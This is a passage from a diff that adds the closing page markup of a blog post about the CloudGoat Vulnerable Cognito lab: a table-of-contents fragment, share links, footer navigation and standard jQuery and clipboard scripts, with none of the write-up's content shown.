toc-level-2"><a class="toc-link" href="#Security-Implications-and-Mitigation"><span class="toc-number">1.8.</span> <span class="toc-text">Security Implications and Mitigation</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&text=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&title=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&is_video=false&description=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cloudgoat-Vulnerable_Cognito&body=Check out this article: https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&title=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&title=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&title=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&title=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&name=Cloudgoat-Vulnerable_Cognito&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&t=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
